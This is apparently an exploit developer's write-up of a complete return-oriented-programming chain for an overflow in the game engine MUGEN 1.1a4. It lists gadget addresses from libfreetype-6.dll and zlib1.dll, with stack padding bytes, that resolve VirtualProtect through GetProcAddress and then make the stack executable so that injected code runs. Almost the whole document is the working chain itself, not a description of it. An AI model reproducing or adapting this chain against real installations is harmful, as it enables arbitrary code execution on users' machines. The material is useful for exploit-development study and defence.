========== Reading this Document ==========

The main content of this document is a list of gadgets used to construct the ROP chain. In any gadget where values are POP'd or ESP is moved, I include the bytes used as padding directly below the gadget.

========== Short Overview of Special Techniques ==========

This is just to make this document a little easier to understand, because a lot of the returns are kind of convoluted. The restrictions imposed by this overflow existing in AssertSpecial processing means I needed to take some really goofy workarounds just to get this to work. If you think you can find a better way to execute some part of the chain - please feel free to reach out :)

These are obviously not groundbreaking techniques or anything, they're just tricky strings of gadgets which might otherwise be quite hard to understand if you haven't looked at ROP chains before.

== Tech 1: ESI as a PUSHAD Invoker
A PUSHAD, RETN gadget is generally used to execute a call to VirtualProtect or even other functions. The reason this is used is because it can be very difficult to find a gadget to push many registers onto the stack immediately before a RET. PUSHAD, RETN allows you to push a huge 8 registers all at once, which means filling out function parameters is trivial, so long as you can get them into the registers.

However, MUGEN 1.1a4 doesn't have an accessible non-rebase PUSHAD gadget. Many PUSHAD gadgets exist in mugen.exe, but these are impossible to access due to the 0x00 byte. This makes executing VirtualProtect directly basically impossible.

I came up with a little workaround which I'm calling an invoker in this document - it's just a short chain that lets me execute from an arbitrary address, including addresses in mugen.exe or the other inaccessible non-rebase module, pthreadVC2.dll. This is achieved by loading an arbitrary value into ESI, then executing a PUSH ESI, RETN gadget. This then returns to whatever instruction I originally wanted to execute (in this case, PUSHAD, RET).

In case you were wondering, getting it into ESI is quite crucial, because PUSHAD puts directly below the top of the stack (EDI top, then ESI) -- this is quite critical because EDI is in use for the return address after PUSHAD, and then everything below ESI is in use for function parameters. ESI's placement is exactly right for this tech.

== Tech 2: PUSHAD as MOV
This one is a little bit sketchier. In general, MUGEN doesn't have good gadgets for moving arbitrary data into EBX, and ECX is also a bit tricky because the best gadgets are also quite destructive. To work around this, it's normally good to load EBX/ECX early, but for EBX especially, I had a lot of trouble as I needed to load it with a value close to ESP. To work around this, I re-used the ESI invoker idea from before, using PUSHAD as a means to move data from some registers into EBX/ECX.

The concept is to execute PUSHAD with the registers loaded in such a way that EBX/ECX are the target of specific POPs. In the instance I used it below, here is how the registers were loaded:

EDI <= Gadget for # POP EBP # RETN (essentially just a pivot)
ESI <= Invoker
EBP <= Gadget for # POP EBX # POP EBP # RETN
ESP <= Popped into EBX!
EBX <= Not used
EDX <= Gadget for # RETN (known as a ROP-Nop, it just skips over this stack entry)
ECX <= Gadget for # POP ECX # OR DH,DH # RETN
EAX <= Popped into ECX!

========== GOAL 1: Get VirtualProtect Function Address ==========

Requires an execution of GetProcAddress(KERNEL32_MODULE_HANDLE, "VirtualProtect")
This requires both obtaining the KERNEL32 module handle, and obtaining a pointer to a string containing VirtualProtect.
Beyond this, a function pointer for GetProcAddress needs to be found.

No VirtualProtect string exists in non-rebase memory, so one is constructed manually at location 0x67BD0210.
The KERNEL32 module handle sits at [0x10008044].
Finally, a GetProcAddress function pointer sits at [0x004DE030].

Stack contents for PUSHAD:
EDI <— Stack pivot (+0x10)
ESI <— Invoker
EBP
ESP
EBX
EDX <— Target for pivot, GetProcAddress function pointer
ECX <— Return address
EAX <— hModule, KERNEL32 Handle
Stack <— lpProcName, 0x67BD0210 (hardcoded to writeable space in non-rebase DLL libfreetype)

=== PREP: write string data to 0x67BD0210 - does not matter what this destroys as the final addr is hardcoded ===
== bytes for VirtualProtect: 56 69 72 74 75 61 6C 50 72 6F 74 65 63 74
== get 0x67BD0210 into EDX
0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
10 02 BD 67

== write "Virt"
0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
C2 68 72 74
0x67bc2cf7 (RVA : 0x00042cf7) : # ADD EAX,94 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF

== increase edx by 3
0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}

== write "tual"
0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
74 75 61 6C
0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF

== increase edx by 4
0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}

== write "Prot"
0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
BC 71 6F 74
0x67bc2cf7 (RVA : 0x00042cf7) : # ADD EAX,94 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF

== increase edx by 3
0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}

== write "tect"
0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
74 63 65 74
0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF

=== ESI <- 0x0048B07B (trashes eax, ebp, ebx, ecx and requires writeable ptr in ebx) ===
0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
72 2D 1D 2D
0x67ba8092 :  # POP ESI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
09 83 2B D3
0x67bc2d96 :  # ADD ESI,EAX # INC ECX # POP EBX # ADD BYTE PTR DS:[EBX+5D],BL # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
--> careful: set ebx=0x67BD0210 to not crash
10 02 BD 67

=== EAX <- KERNEL32 handle [0x10008044] (trashes ebx) ===
0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
27 80 FF 0F
0x67b9363f (RVA : 0x0001363f) : # ADD EAX,1000D # ADD DH,DH # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
0x67bc90cc :  # MOV EBX,DWORD PTR DS:[EAX+10] # ADD ESP,14 # MOV EAX,EBX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF

=== EDI <-> EAX for safekeeping while EAX is trashed ===
0x62e89739 (RVA : 0x00009739) : # XCHG EAX,EDI # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}

=== EDX <- GetProcAddress function pointer [0x004DE030] (trashes eax, ebx, ebp) ===
0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
B2 F2 E2 E2
0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
6E ED 6A 1D
0x67bb13df (RVA : 0x000313df) : # ADD EAX,EDX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
FF FF FF FF
FF FF FF FF
0x67bc90cc :  # MOV EBX,DWORD PTR DS:[EAX+10] # ADD ESP,14 # MOV EAX,EBX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
0x62e838ce (RVA : 0x000038ce) : # XCHG EAX,EBP # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}
0x67bbd0bd (RVA : 0x0003d0bd) : # PUSH EBP # MOV EAX,8B04468B # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}

=== ECX <- return address  (trashes ebx, ebp) ===
0x67b8fc01 (RVA : 0x0000fc01) : # POP ECX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
FF FF FF FF <— should be replaced with the first gadget for executing VirtualProtect
FF FF FF FF
FF FF FF FF

=== EAX <- EDI from before (just restores) ===
0x62e89739 (RVA : 0x00009739) : # XCHG EAX,EDI # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}

=== EDI <- Pivot 0x62E8C739 (trashes ebp) ===
*Note: Pivot = 0x62e8c739 : {pivot 16 / 0x10} :  # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}
0x67bcd812 (RVA : 0x0004d812) : # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
39 C7 E8 62
FF FF FF FF

=== Invoke ESI ===
0x67ba1310 :  # PUSH ESI # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
*Note: at this point ESI contains the addr of the PUSHAD gadget.

Aftermath: EAX=[VirtualProtect]

========== GOAL 2: Execute VirtualProtect against Stack ==========

Followup is to execute VProtect to enable stack code execution. Basically the same setup as the GetProcAddress, but much more difficult.

Note that as the output of GOAL 1 was placed in EAX, it's written to memory at 0x67BD0324 for safekeeping while prepping the other registers.

EDI <— stack pivot (0x67BCD813)
ESI <- Invoker
EBP <— VirtualProtect address
ESP <— Return address
EBX <— lpAddress, something close to ESP
EDX <— dwSize, 0x400
ECX <— flNewProtect, 0x40
EAX <— lpflOldProtect (writeable region at 0x67BD0228)
Base

=== PREP: Preserve EAX in writeable memory 0x67BD0324 ===
0x62e89739 (RVA : 0x00009739) : # XCHG EAX,EDI # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}
0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
24 03 BD 67
0x62e89739 (RVA : 0x00009739) : # XCHG EAX,EDI # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}
0x67bc049a :  # MOV DWORD PTR DS:[EDX],EAX # ADD ESP,10 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF
FF FF FF FF

=== ESI <- 0x0048B07B (trashes eax, ebp, ebx, ecx and requires writeable ptr in ebx) ===
0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
72 2D 1D 2D
0x67ba8092 :  # POP ESI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
--> set esi=0xd32b8309
09 83 2B D3
FF FF FF FF
0x67bc2d96 :  # ADD ESI,EAX # INC ECX # POP EBX # ADD BYTE PTR DS:[EBX+5D],BL # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
--> careful: set ebx=0x67BD0210 to not crash
10 02 BD 67


=== EBX <- old ESP (trashes EBP, EDI, ESI) AND ECX <- 0x40 flNewProtect via PUSHAD as MOV ===
EDI must contain: 0x67BA8092 :  # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
EBP must contain: 0x67b90484 :  # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
EDX must contain: 0x67BBD0C6 :  # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
ECX must contain: 0x62e89a66 :  # POP ECX # OR DH,DH # RETN    ** [zlib1.dll] **   |   {PAGE_EXECUTE_READ}

=> Load EDI
0x67bcd812 (RVA : 0x0004d812) : # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
C0 02 B9 67
84 04 B9 67
=> Load EDX
0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
C6 D0 BB 67
=> Load ECX and EBP
0x67b8fc01 :  # POP ECX # POP EBX # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
66 9A E8 62
FF FF FF FF
84 04 B9 67
=> Load EAX with 0x40 to store into ECX
0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
C8 FF FF FF
0x67bc2ce7 (RVA : 0x00042ce7) : # ADD EAX,78 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
=> Invoke ESI for PUSHAD
0x67ba1310 :  # PUSH ESI # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}

=== EDX <- 0x400 dwSize ===
0x67bbd0c3 :  # POP EDX # ADD AL,29 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
FF FF 83 FF
0x67ba26ac :  # ADD EDX,8000 # POP EBP # MOV EAX,EDX # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
FF FF FF FF
0x67b995e9 (RVA : 0x000195e9) : # INC EDX # ADD AL,39 # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}

=== EDI <- Pivot (0x67BCD813) ===
0x67bcd812 (RVA : 0x0004d812) : # POP EDI # POP EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
13 D8 BC 67
FF FF FF FF

=== EBP <- [0x67BD0224] VirtualProtect address ===
0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
BC 01 BD 67
0x67b9d077 :  # MOV EAX,DWORD PTR DS:[EAX+168] # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}
0x67ba12b6 (RVA : 0x000212b6) : # XCHG EAX,EBP # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}

=== EAX <- lpflOldProtect (0x67BD0228) ===
0x67b81c02 (RVA : 0x00001c02) : # POP EAX # RETN
28 02 BD 67

=== Invoke ESI ===
0x67ba1310 :  # PUSH ESI # RETN    ** [libfreetype-6.dll] **   |   {PAGE_EXECUTE_READ}

Aftermath: Executing code contained directly below this instruction.